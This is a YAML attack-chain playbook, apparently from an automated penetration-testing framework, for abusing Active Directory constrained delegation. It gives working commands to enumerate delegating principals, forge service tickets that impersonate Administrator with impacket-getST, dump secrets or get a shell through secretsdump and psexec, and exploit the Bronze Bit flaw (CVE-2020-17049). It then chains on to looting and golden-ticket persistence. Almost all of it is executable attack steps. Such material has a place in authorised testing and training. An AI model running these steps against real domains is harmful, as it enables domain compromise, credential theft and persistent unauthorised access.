id: constrained-delegation-s4u
name: "AD — Constrained delegation S4U2self + S4U2proxy abuse"
description: >
  A computer or service account with msDS-AllowedToDelegateTo set on
  specific SPNs can ask the KDC for a ticket as ANY user to those SPNs
  (S4U2self + S4U2proxy). Often missed in BloodHound's "shortest path"
  paths.
tags: [delegation, constrained-delegation, s4u, kerberos, active-directory]
difficulty: medium

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: domain
    source: target_context.domain
    required: true
  - name: delegating_principal
    description: "User or computer with msDS-AllowedToDelegateTo set."
    required: true
  - name: delegating_password
    description: "Password OR NT hash of the delegating principal."
    required: true
  - name: target_spn
    description: "SPN listed in msDS-AllowedToDelegateTo (e.g. cifs/dc01.corp.local)."
    required: true

steps:
  - id: enumerate_delegation
    name: "Find principals with constrained delegation set"
    command_ref: nxc-ldap-find-delegation
    inputs:
      dc-ip: "${dc_ip}"
    notes: |
      Output lists `<principal>  Constrained  <spn1>;<spn2>;...`. Record
      the SPN list — those are the only services you can ride into via
      S4U2proxy. Look for cifs/, host/, http/ — particularly if listed
      against a DC, you basically own the domain.

  - id: with_protocol_transition
    name: "S4U2self + S4U2proxy (with protocol transition)"
    inline_command: |
      impacket-getST \
        -spn '<target_spn>' \
        -impersonate Administrator \
        -dc-ip <dc-ip> \
        '<domain>/<principal>:<password>'
    inputs:
      dc-ip: "${dc_ip}"
      domain: "${domain}"
      principal: "${delegating_principal}"
      password: "${delegating_password}"
      target_spn: "${target_spn}"
    notes: |
      `TRUSTED_TO_AUTH_FOR_DELEGATION` ("with protocol transition") allows
      the impersonation of ANY user even without an inbound TGT. If you
      see only `TRUSTED_FOR_DELEGATION` (no protocol transition), this
      chain won't fly — use the unconstrained-delegation-printerbug chain
      instead.
    capture:
      - var: s4u_ccache
        regex: "Saving ticket in (\\S+\\.ccache)"
        match: first

  - id: use_ticket
    name: "Use the forged ticket"
    inline_command: |
      export KRB5CCNAME=<ccache>
      klist
      # If target_spn is cifs/<host>:
      impacket-secretsdump -k -no-pass <host>
      # If host/<host>:
      impacket-psexec -k -no-pass <host>
    inputs:
      ccache: "${s4u_ccache}"
    notes: |
      Each ticket is tied to ONE SPN. Need both cifs and host (psexec)?
      Re-run S4U2proxy for each SPN — or use krbrelayx to spray.

  - id: alt_protocol
    name: "No protocol transition? Try the Bronze Bit (CVE-2020-17049)"
    inline_command: "impacket-getST -spn '<target_spn>' -impersonate Administrator -dc-ip <dc-ip> -force-forwardable '<domain>/<principal>:<password>'"
    inputs:
      dc-ip: "${dc_ip}"
      domain: "${domain}"
      principal: "${delegating_principal}"
      password: "${delegating_password}"
      target_spn: "${target_spn}"
    notes: |
      `-force-forwardable` exploits CVE-2020-17049. Patched on most modern
      DCs but lives on CTF/lab boxes for years.

references:
  - title: "Wagging the Dog (Constrained Delegation)"
    url:   "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
  - title: "The Hacker Recipes — Constrained Delegation"
    url:   "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained"

next_chains:
  - chain: dpapi-secrets-extraction
    when:   's4u_ccache + target is a server'
    reason: 'Loot the target with the forged ticket.'
  - chain: ad-persistence-golden-ticket
    when:   'target_spn covered the DC'
    reason: 'Domain-wide compromise → persistence.'
